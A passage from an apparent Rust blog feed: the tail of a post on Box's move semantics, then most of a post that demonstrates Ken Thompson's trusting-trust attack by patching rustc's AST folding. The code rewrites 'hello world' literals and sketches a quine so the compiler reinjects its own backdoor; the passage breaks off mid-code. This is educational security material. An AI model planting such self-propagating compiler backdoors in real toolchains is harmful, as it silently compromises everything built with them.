</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">;</span> <span class="c1">// moves the vec out into `y`, then deallocates the box</span>
</span><span class='line'>            <span class="c1">// but does not call a destructor on the vec</span>
</span></code></pre></td></tr></table></div></figure>


<p>For any other type, such an operation will produce a &ldquo;cannot move out of a borrow&rdquo; error.</p>

<p>This operation is colloquially called <code>DerefMove</code>, and there has been <a href="https://github.com/rust-lang/rfcs/pull/178/files?short_path=6f69a99#diff-6f69a990502a98c2eeb172d87269005d">an rfc</a> in the
past for making it into a trait. I suspect that the <code>DerefMove</code> semantics could even have been
removed from <code>Box&lt;T&gt;</code> before 1.0 (I don&rsquo;t find it <em>necessary</em>), but people had better things to do,
like fixing the million other rough edges of the language that can&rsquo;t be touched after backwards
compatibility is a thing.</p>

<p>So now we&rsquo;re stuck with it. The current status is that <code>Box&lt;T&gt;</code> is <em>still</em> a special type in the
compiler. By &ldquo;special type&rdquo; I don&rsquo;t just mean that the compiler treats it a bit differently (this is
true for any lang item), I mean that it literally is treated as
<a href="http://manishearth.github.io/rust-internals-docs/rustc/ty/enum.TypeVariants.html#TyBox.v">a completely new kind of type</a>, not as a struct the way it has been defined in liballoc.
There&rsquo;s a TON of cruft in the compiler related to this type, much of which can be removed, but some
of which can&rsquo;t. If we ever do get <code>DerefMove</code>, we should probably try removing it all again. After
writing this post I&rsquo;m half-convinced to try and implement an internal-use-only <code>DerefMove</code> and try
cleaning up the code myself.</p>

<p>Most of this isn&rsquo;t really useful to know unless you actually come across a case where you can make
use of <code>DerefMove</code> semantics, or if you work on the compiler. But it certainly is interesting!</p>

<p>Next post: <a href="http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/">What is a lang item?</a></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Seriously though, does anyone use it much? I&rsquo;ve only seen it getting used for boxed DSTs (trait objects and boxed slices), which themselves are pretty rare, for sending heap types over FFI, recursive types (rare), and random special cases. I find this pretty interesting given that other languages are much more liberal with non-refcounted single-element allocation.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>It will probably eventually be replaced or made equivalent to the <code>&lt;-</code> syntax before stabilizing<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>It&rsquo;s easier to special case the first two, much like how <code>for</code> loops are aware of the iterator trait without the iterator trait being extremely special cased<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2016/12/02/reflections-on-rusting-trust/"/>
    <updated>2016-12-02T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2016/12/02/reflections-on-rusting-trust</id>
    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.</p>

<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.</p>

<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>

<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>

<h2>The attack</h2>

<p>The essence of the attack is this:</p>

<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
by their modified compiler.</p>

<p>However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.</p>

<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>

<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
need to be modified for it to work; just the non-human-readable binary.</p>

<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<h2>Backdooring Rust</h2>

<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
don&rsquo;t actually want to backdoor the compiler.</p>

<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>

<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
with &ldquo;जगाला नमस्कार&rdquo;, a rough translation of the same in my native language.</p>

<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>

<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).</p>

<p>So I write the following <code>Folder</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// Understanding the minute details of this code isn&#39;t important; it is a bit complex</span>
</span><span class='line'><span class="c1">// since the API used here isn&#39;t meant to be used this way. Focus on the comments.</span>
</span><span class='line'>
</span><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// The trait contains default impls which we override for specific cases</span>
</span><span class='line'>    <span class="k">impl</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// every time we come across an expression, run this function</span>
</span><span class='line'>        <span class="c1">// on it and replace it with the produced expression in the tree</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// The peculiar `.map` pattern needs to be used here</span>
</span><span class='line'>            <span class="c1">// because of the way AST nodes are stored in immutable</span>
</span><span class='line'>            <span class="c1">// `P&lt;T&gt;` pointers. The AST is not typically mutated.</span>
</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                            <span class="c1">// look for string literals</span>
</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                                <span class="c1">// replace their contents</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;जगाला नमस्कार&quot;</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">}</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="n">l</span>
</span><span class='line'>                        <span class="p">})</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="c1">// recurse down expression with the default fold</span>
</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>            <span class="p">})</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// Folders are not typically supposed to operate on pre-macro-expansion ASTs</span>
</span><span class='line'>            <span class="c1">// and will by default panic here. We must explicitly specify otherwise.</span>
</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// our entry point</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// make a folder, fold the crate with it</span>
</span><span class='line'>        <span class="n">TrustFolder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>

<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// test.rs</span>
</span><span class='line'><span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&quot;hello world&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage1 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>जगाला नमस्कार
</span></code></pre></td></tr></table></div></figure>


<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.</p>

<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
<code>trust::fold_crate()</code> call).</p>

<p>We need to tweak our folder so that it does two things:</p>

<ul>
<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
<li>Inserts the <code>trust</code> module</li>
</ul>


<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
are within the same module, so the instructions for outputting <em>these</em> instructions need to be
included, and so on. This clearly isn&rsquo;t viable.</p>

<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;/* stringified contents of this module except for this line */&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the code of the module entered in, this will look something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;</span>
</span><span class='line'><span class="s">        // .. </span>
</span><span class='line'><span class="s">        fn fold_mod(..) {</span>
</span><span class='line'><span class="s">            // ..</span>
</span><span class='line'><span class="s">            // this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'><span class="s">            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'><span class="s">            // once to produce the code for the module</span>
</span><span class='line'><span class="s">            let code_for_module = </span><span class="se">\&quot;</span><span class="s">mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\\\&quot;\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;\\\&quot;</span><span class="s">;</span><span class="se">\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;</span><span class="s">}</span><span class="se">\&quot;</span><span class="s">;</span>
</span><span class='line'><span class="s">            insert_into_crate(code_for_module);</span>
</span><span class='line'><span class="s">            // ..</span>
</span><span class='line'><span class="s">        }</span>
</span><span class='line'><span class="s">        // ..</span>
</span><span class='line'><span class="s">    &quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice &ndash; once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
the original AST!</p>

<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
works, without worrying about this cyclical quineyness:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// dummy string just to see if it gets injected</span>
</span><span class='line'>    <span class="c1">// inserting the full code of this module has some practical concerns</span>
</span><span class='line'>    <span class="c1">// about escaping which I&#39;ll address later</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;use foo::bar::blah;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">parse_crate_from_source_str</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">util</span><span class="o">::</span><span class="n">move_map</span><span class="o">::</span><span class="n">MoveMap</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">rustc</span><span class="o">::</span><span class="n">session</span><span class="o">::</span><span class="n">Session</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// we need the session to be able to parse things. No biggie.</span>
</span><span class='line'>        <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">Session</span><span class="p">,</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">impl</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
